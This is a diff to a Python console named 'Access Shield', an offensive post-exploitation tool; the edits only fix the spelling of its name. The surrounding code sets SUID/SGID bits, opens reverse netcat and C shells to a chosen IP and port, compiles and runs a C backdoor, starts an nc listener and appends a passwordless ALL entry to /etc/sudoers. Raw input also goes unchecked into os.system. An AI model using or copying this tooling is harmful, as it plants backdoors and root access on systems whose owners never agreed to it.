@@ -7,14 +7,14 @@ user = getpass.getuser()
 print('''
 =============================================================================================
 
-                                   _____ _          _ _     _ 
-     /\                           / ____| |        (_) |   | |
-    /  \   ___ ___ ___  ___ ___  | (___ | |__   ___ _| | __| |
-   / /\ \ / __/ __/ _ \/ __/ __|  \___ \| '_ \ / _ \ | |/ _` |
-  / ____ \ (_| (_|  __/\__ \__ \  ____) | | | |  __/ | | (_| |
- /_/    \_\___\___\___||___/___/ |_____/|_| |_|\___|_|_|\__,_|
+                                   _____ _     _      _     _ 
+     /\                           / ____| |   (_)    | |   | |
+    /  \   ___ ___ ___  ___ ___  | (___ | |__  _  ___| | __| |
+   / /\ \ / __/ __/ _ \/ __/ __|  \___ \| '_ \| |/ _ \ |/ _` |
+  / ____ \ (_| (_|  __/\__ \__ \  ____) | | | | |  __/ | (_| |
+ /_/    \_\___\___\___||___/___/ |_____/|_| |_|_|\___|_|\__,_|
                                                               
-                                                                                                                         
+                                                              
 =============================================================================================
 
     ''')
@@ -29,7 +29,7 @@ print('Access Sheild Console:')
 print('For list of commands type help')
 
 while True:
-    command = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m>')
+    command = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m>')
 #################START OF NEUTRAL COMMANDS##################
     if str(command) == 'help':
         print('''
@@ -116,7 +116,7 @@ while True:
 
     elif str(command) == 'createSUID':
         print('please enter in the path of the file you want to set SUID on')
-        suidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m' + '\033[1;34;40m' + '/' + 'suid-console\033[0m' '>')
+        suidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m' + '\033[1;34;40m' + '/' + 'suid-console\033[0m' '>')
         if len(suidCommand) > 0:
             try:
                 if os.path.exists(suidCommand):
@@ -129,7 +129,7 @@ while True:
 
     elif str(command) == 'createSGID':
         print('please enter in the path of the file you want to set SGID on')
-        sgidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m' + '\033[1;34;40m' + '/' + 'sgid-console\033[0m' '>')
+        sgidCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m' + '\033[1;34;40m' + '/' + 'sgid-console\033[0m' '>')
         if len(sgidCommand) > 0:
             try:
                 if os.path.exists(sgidCommand):
@@ -151,7 +151,7 @@ sudo - to infect the sudoers file
 
         ''')
 
-        backCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' '>')
+        backCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' '>')
         
         if str(backCommand) == 'return':
             print('returning you to the normal shell!')
@@ -164,11 +164,11 @@ nc {ip} {port} - will attempt to setup a reverse netcat shell on that specific p
 C {ip} {port} - will attempt to setup a reverse C shell on that specific port
 
             ''')
-            revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
+            revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
             revCommand = str(revCommand).split()
             if len(revCommand) < 3:
                 print('you do not have enough arguments!')
-                revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
+                revCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'reverse\033[0m' + '>')
                 revCommand = str(revCommand).split()
             if revCommand[0] == 'nc':
                 print('Attempting to create netcat reverse shell to ' + revCommand[1] + ' on port ' + revCommand[2] + '...')
@@ -217,13 +217,13 @@ int main(void){
                 os.system('gcc back.c --output shl && ./shl')
         if str(backCommand) == 'sudo':
             print('What user would you like to have sudo privileges?')
-            sudoCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'sudo\033[0m' + '>')
+            sudoCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'sudo\033[0m' + '>')
             try:
                 os.system('echo "' + sudoCommand + ' ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
             except: print('There was an error attempting to create a sudoers backdoor!')
         if str(backCommand) == 'listen':
             print('What port?')
-            lisCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessSheild-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'listen\033[0m' + '>')
+            lisCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@AccessShield-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'listen\033[0m' + '>')
             os.system('nc -lnvp ' + lisCommand)
 #################END OF PERSISTENCE COMMANDS##################
 
